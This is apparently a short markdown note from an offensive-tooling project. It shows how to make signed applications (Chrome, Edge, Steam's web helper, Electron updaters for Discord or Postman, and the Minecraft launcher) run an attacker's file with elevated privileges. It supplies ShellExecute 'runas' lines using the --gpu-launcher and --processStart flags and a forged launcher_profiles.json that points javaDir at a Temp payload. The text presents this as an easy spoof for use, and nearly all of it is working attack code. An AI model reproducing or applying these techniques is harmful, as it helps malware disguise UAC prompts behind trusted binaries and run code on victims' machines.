This is a very easy spoof since all it needs is a signed program to launch the attackers code while maintaining admin privileges.

# Chromium
Will run what ever program is set in `gpu-launcher` 
```js
App.ShellExecute "C:\Program Files\Google\Chrome\Application\chrome.exe", "--disable-gpu-sandbox --gpu-launcher=" + <FILE>, , "runas"
```
```js
App.ShellExecute "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "--disable-gpu-sandbox --gpu-launcher=" + <FILE>, , "runas"
```
```js
App.ShellExecute "C:\Program Files (x86)\Steam\bin\cef\cef.win7x64\steamwebhelper.exe", "--disable-gpu-sandbox --gpu-launcher=" + <FILE>, , "runas"
```

# Electron
Will run what ever program is set in `processStart` 
```js
App.ShellExecute <Discord/Postman> + "Update.exe", "--processStart <FILE>", , "runas"
```

# Minecraft
Will run what ever program is set as the `javaDir` in `launcher_profiles.json` 
```js
Profiles = "{""profiles"":{""release"":{""created"":""1970-01-02T00:00:00.000Z"",""icon"":""Grass"",""javaDir"":""<RUNTIME>"",""lastUsed"":""1970-01-02T00:00:00.000Z"",""lastVersionId"":""latest-release"",""name"":"""",""type"":""latest-release""},""snapshot"":{""created"":""1970-01-01T00:00:00.000Z"",""icon"":""Dirt"",""javaDir"":""<RUNTIME>"",""lastUsed"":""1970-01-01T00:00:00.000Z"",""lastVersionId"":""latest-snapshot"",""name"":"""",""type"":""latest-snapshot""}},""settings"":{""crashAssistance"":true,""enableAdvanced"":false,""enableAnalytics"":true,""enableHistorical"":false,""enableReleases"":true,""enableSnapshots"":false,""keepLauncherOpen"":false,""profileSorting"":""ByLastPlayed"",""showGameLog"":false,""showMenu"":false,""soundOn"":false},""version"":3}"
Profiles = Replace(Profiles, "<RUNTIME>", Replace(Temp, "\", "\\"))
```
